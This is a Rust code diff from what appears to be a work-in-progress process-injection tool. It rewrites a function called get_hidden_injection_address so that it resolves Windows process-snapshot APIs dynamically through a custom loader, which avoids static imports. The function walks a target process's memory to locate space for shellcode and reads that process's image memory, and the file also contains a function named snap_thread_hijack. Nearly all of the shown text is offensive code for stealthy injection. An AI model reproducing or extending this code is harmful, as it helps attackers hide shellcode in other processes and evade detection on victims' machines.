@@ -17,14 +17,13 @@ use winapi::{
         winerror::ERROR_SUCCESS,
     },
     um::{
-        heapapi::{GetProcessHeap, HeapAlloc, HeapFree},
-        memoryapi::{ReadProcessMemory, VirtualProtectEx, WriteProcessMemory},
-        winnt::{
-            CONTEXT, HANDLE, HEAP_ZERO_MEMORY, MEMORY_BASIC_INFORMATION, MEM_IMAGE,
-            PAGE_EXECUTE_READ, PAGE_READWRITE,
-        },
+        heapapi::{GetProcessHeap, HeapAlloc, HeapFree}, memoryapi::{ReadProcessMemory, VirtualProtectEx, WriteProcessMemory}, processsnapshot::{PSS_CAPTURE_VA_CLONE, PSS_CAPTURE_VA_SPACE_SECTION_INFORMATION}, winnt::{
+            CONTEXT, CONTEXT_ALL, HANDLE, HEAP_ZERO_MEMORY, MEMORY_BASIC_INFORMATION, MEM_IMAGE, PAGE_EXECUTE_READ, PAGE_READWRITE
+        }
     },
 };
+use winapi::um::processsnapshot::PSS_CAPTURE_VA_SPACE;
+use winapi::um::processsnapshot::PSS_CAPTURE_FLAGS as PSS_CAPTURE_FLAGS_winapi;
 
 // Windows-rs imports
 use windows::Win32::System::Diagnostics::ProcessSnapshotting::{
@@ -71,21 +70,82 @@ pub fn capture_process_snapshot(handle: HANDLE) -> Result<ProcessSnapshot, Strin
 }
 
 pub fn get_hidden_injection_address(
-    process_handle: HANDLE,
+    //process_handle: HANDLE,
+    target_process: *mut winapi::ctypes::c_void,
     shellcode_size: usize,
+    kernel32: *mut std_c_void,
 ) -> Result<*mut winapi_c_void, String> {
-    let snapshot = capture_process_snapshot(process_handle)?;
+    //i dont like how this is done. we end up snappshotting the process twice.
+    //but im going to finish this and then ill come back to refactor it all.
+
+    //instead of using capture_process_snapshot, we'll dynamically load the snapshotting functions
+
+    //let snapshot = capture_process_snapshot(process_handle)?;
+
+    let mut snapshot_ctx: CONTEXT = unsafe { zeroed() };
+    let mut snapshot_handle = HPSS::default();
+    let mut walk_marker_handle = HPSSWALK::default();
+    let mut thread_entry: PSS_THREAD_ENTRY = unsafe { zeroed() };
+    let mut buffer = vec![0u8; std::mem::size_of::<PSS_THREAD_ENTRY>()];
+
+    // Capture snapshot
+    let capture_flags: PSS_CAPTURE_FLAGS_winapi = PSS_CAPTURE_VA_CLONE | PSS_CAPTURE_VA_SPACE | PSS_CAPTURE_VA_SPACE_SECTION_INFORMATION;
+    let win32_handle = windows::Win32::Foundation::HANDLE(target_process as _);
+
+    //get the function address for PssCaptureSnapshot
+    let pss_capture_snapshot_address = noldr::get_function_address(kernel32, "PssCaptureSnapshot");
+
+    let pss_capture_snapshot = unsafe {
+        let fn_ptr = match pss_capture_snapshot_address {
+            Some(addr) => addr,
+            None => return Err("Failed to get PssCaptureSnapshot address".to_string()),
+        };
+
+        std::mem::transmute::<_, extern "system" fn(HANDLE, PSS_CAPTURE_FLAGS_winapi, u32, *mut HPSS) -> u32>(
+            fn_ptr,
+        )
+    };
+
+    let pss_result = pss_capture_snapshot(
+        target_process,
+        capture_flags,
+        CONTEXT_ALL,
+        &mut snapshot_handle,
+    );
+
+    if pss_result != 0 {
+        eprintln!("[!] PssCaptureSnapshot failed: Win32 error {}", unsafe {
+            winapi::um::errhandlingapi::GetLastError()
+        });
+        return Err("Failed to capture snapshot".to_string());
+    }
+    //print snapshot handle
+
+    println!("Snapshot handle: {:?}", snapshot_handle.0);
+
     let mut shellcode_location: *mut winapi_c_void = null_mut();
     let mut walker = HPSSWALK::default();
-    let pss_success = unsafe { PssWalkMarkerCreate(None, &mut walker) };
+    //get the function address for PssWalkMarkerCreate
+    let pss_walk_marker_create_address =
+        noldr::get_function_address(kernel32, "PssWalkMarkerCreate");
 
-    if pss_success != ERROR_SUCCESS {
-        eprintln!(
-            "[!] PssWalkMarkerCreate failed: Win32 error {}",
-            pss_success
-        );
-    } else {
-        //println!("PssWalkMarkerCreate succeeded");
+    //define the function signature
+    type PssWalkMarkerCreateFn =
+        unsafe extern "system" fn(*const PSS_ALLOCATOR, *mut HPSSWALK) -> u32;
+
+    //call the function
+    let pss_result = unsafe {
+        std::mem::transmute::<_, PssWalkMarkerCreateFn>(match pss_walk_marker_create_address {
+            Some(addr) => addr,
+            None => return Err("Failed to get PssWalkMarkerCreate address".to_string()),
+        })(std::ptr::null(), &mut walker)
+    };
+
+    if pss_result != 0 {
+        eprintln!("[!] PssWalkMarkerCreate failed: Win32 error {}", unsafe {
+            winapi::um::errhandlingapi::GetLastError()
+        });
+        return Err("Failed to create walk marker".to_string());
     }
 
     //println!("Walk Marker Handle: 0x{:?}", walker);
@@ -99,9 +159,12 @@ pub fn get_hidden_injection_address(
         snapshot.snapshot_handle as usize
     );*/
     //println!("Walker handle raw: {:#x}", walker.0 as usize);
+
+    //YOU ARE HERE
+
     let mut pss_success = unsafe {
         let result = PssWalkSnapshot(
-            HPSS(snapshot.snapshot_handle as *mut std_c_void),
+            snapshot_handle,
             PSS_WALK_VA_SPACE,
             walker,
             Some(&mut buffer),
@@ -152,7 +215,7 @@ pub fn get_hidden_injection_address(
 
                     let success = unsafe {
                         ReadProcessMemory(
-                            process_handle,
+                            target_process,
                             va_space_entry.ImageBase as *const winapi_c_void,
                             stack,
                             shellcode_size,
@@ -198,7 +261,7 @@ pub fn get_hidden_injection_address(
 
         pss_success = unsafe {
             let result = PssWalkSnapshot(
-                HPSS(snapshot.snapshot_handle as *mut std_c_void),
+                snapshot_handle,
                 PSS_WALK_VA_SPACE,
                 walker,
                 Some(&mut buffer),
@@ -508,8 +571,9 @@ pub fn snap_thread_hijack(
             };
         }
 
-        //locate the function address for PssWalkMarkerFree 
-        let pss_walk_marker_free_address = noldr::get_function_address(kernel32, "PssWalkMarkerFree");
+        //locate the function address for PssWalkMarkerFree
+        let pss_walk_marker_free_address =
+            noldr::get_function_address(kernel32, "PssWalkMarkerFree");
 
         //define the function signature
         type PssWalkMarkerFreeFn = unsafe extern "system" fn(HPSSWALK) -> u32;
